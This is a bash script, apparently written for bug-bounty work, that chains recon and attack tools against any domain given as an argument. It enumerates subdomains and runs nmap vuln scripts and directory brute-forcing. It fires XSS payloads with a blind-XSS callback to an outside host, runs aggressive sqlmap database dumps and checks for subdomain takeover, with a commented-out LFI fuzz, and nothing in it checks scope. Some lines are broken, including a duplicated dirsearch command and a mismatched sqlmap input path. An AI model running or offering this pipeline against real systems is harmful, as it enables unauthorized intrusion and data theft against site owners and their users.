#!/bin/bash

###################################################################
#Script Name	: Recon with El_Cazad0r                                                                                                                                                                                 
#Author       	: El_Cazad0r                                               
#Email         	: el_cazad0r@outlook.com                                           
###################################################################


########################################
# Happy Hunting
########################################

banner el cazador

domain=$1

mkdir -p /root/Projects/$domain/

echo "Getting domains from crtsh"

python3 /root/crtsh/crtsh.py -d $1 | anew /root/Projects/$domain/subdomains.txt

echo -e "\n Getting domains from subfinder"

subfinder -d $1 -recursive | anew /root/Projects/$domain/subdomains.txt

echo -e "\n Getting domains from assetfinder"

assetfinder -subs-only $1 |grep -v "*." | anew /root/Projects/$domain/subdomains.txt

echo -e "\n Getting domains from findomain"

./findomain-linux -t $1  -u  /root/Projects/$domain/findomain_subdomains.txt

echo -e "\n Getting domains from Sublist3r"

python3 /root/Sublist3r/sublist3r.py -d $1 -o /root/Projects/$domain/sublister_subdomains.txt

echo -e "\n Getting domains from Amass"

amass enum -passive -d $1 -o /root/Projects/$domain/amass_subdomains.txt

echo -e "\n Getting domains for Nmap scan into allsubdomain.txt"

cat /root/Projects/$domain/subdomains.txt  /root/Projects/$domain/sublister_subdomains.txt  /root/Projects/$domain/amass_subdomains.txt  /root/Projects/$domain/findomain_subdomains.txt | anew allsubdomains.txt


echo -e "\n Getting domains Sorted into sorted_subdomain.txt"

cat /root/Projects/$domain/subdomains.txt /root/Projects/$domain/sublister_subdomains.txt  /root/Projects/$domain/amass_subdomains.txt /root/Projects/$domain/findomain_subdomains.txt| httprobe | sort -u > /root/Projects/$domain/sorted_subdomain.txt

echo -e "\n Getting all live domains into live_domains.txt"

cat /root/Projects/$domain/sorted_subdomain.txt | httpx | anew /root/Projects/$domain/live_domains.txt

echo -e "\n NMap Scanning in Progress"

nmap -sV -iL allsubdomains.txt -oN scanned-port.txt --script=vuln

echo -e "\n Doing a complete directory Brute Force"

python3 /root/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json python3 /root/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -l /root/Projects/$domain/sorted_subdomain.txt


echo -e "\n Getting all URLS using waybackurls"

cat /root/Projects/$domain/sorted_subdomain.txt | waybackurls | sort -u > /root/Projects/$domain/All_Urls.txt

echo -e "\n Getting all live URLS"

cat /root/Projects/$domain/All_Urls.txt | httpx | tee -a /root/Projects/$domain/live_urls.txt


echo -e "\n Getting parameter_urls"

cat /root/Projects/$domain/sorted_subdomain.txt | xargs -I % python3 /root/Tools/ParamSpider/paramspider.py -l high --exclude php,svg,jpg,png,jpeg,css,woff,woff2,tif,tiff,gif,ico,pdf,txt,js -o /root/Projects/$domain/Parameters/% -d%;


echo -e "\n Place All Parameter URLS into parameter_urls.txt and Live_parameter_urls.txt"

cat /root/Projects/$domain/Parameters/* | tee  /root/Projects/$domain/param_urls.txt

cat /root/Projects/$domain/param_urls.txt | sort -u | tee /root/Projects/$domain/unique_param_urls.txt

cat /root/Projects/$domain/param_urls.txt | httpx | anew /root/Projects/$domain/live_param_urls.txt 


echo "Getting openredir_urls"

cat /root/Projects/$domain/All_Urls.txt  /root/Projects/$domain/param_urls.txt|egrep -e ?url= -e ?rurl -e ?next -e ?link -e ?lnk -e ?target= -e ?dest= -e ?destination= -e ?redir -e ?redirect_uri -e ?redirect_url -e /redirect/ -e ?view= -e ?login -e ?to= -e ?image_url= -e ?return= -e ?returnTo= -e ?return_to= -e ?continue= -e ?return_path= -e path= -e location= -e /out/ -e /out? -e ?go= -e ?return= -e /cgi-bin/redirect.cgi?| anew /root/Projects/$domain/openredir_urls.txt

echo -e "\n Checking for Subdomain Takeover"

subzy r --targets /root/Projects/$domain/sorted_subdomain.txt --concurrency 20 --hide_fails | anew /root/Projects/$domain/subdomain_takeover.txt


echo -e "\n Checking for any sensitive keys/information using XKeys"

cat /root/Projects/$domain/All_Urls.txt | xkeys -o /root/Projects/$domain/ | grep -v "Nothing!" | anew /root/Projects/$domain/Xkeys_output.txt


echo -e "\n Checking for HTTP Smuggling"

cat /root/Projects/$domain/sorted_subdomain.txt | httpx | python3  /root/Tools/smuggler/smuggler.py | anew /root/Projects/$domain/HTTP_smuggling.txt


#echo -e "\n Checking for LFI"

#cat /root/Projects/$domain/All_Urls.txt |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w /root/el_cazador/LFI.txt ; done

echo -e "\n Checking for XSS"

cat /root/Projects/$domain/All_Urls.txt |httpx| kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b  https://elcazador.bxss.in

echo -e "\n Checking for SQLI"

gf sqli /root/Projects/$domain/All_Urls.txt >> sqli.txt ; sqlmap -m /root/Projects/$domain/sqli.txt --dbs --banner --batch --risk 3 --level 3

echo -e "\n Checking Nuclei Results"

nuclei -l /root/Projects/$domain/sorted_subdomain.txt -o /root/Projects/$domain/nuclei_result.txt

echo -e "\n Checking for GitHub Dorks"

python3  /root/el_cazador/GitDorker/GitDorker.py -t  "Add Your GitHub Token"  -org $domain -d  /root/el_cazador/gitdork.txt  -o  /root/Projects/$domain/githubdork.txt
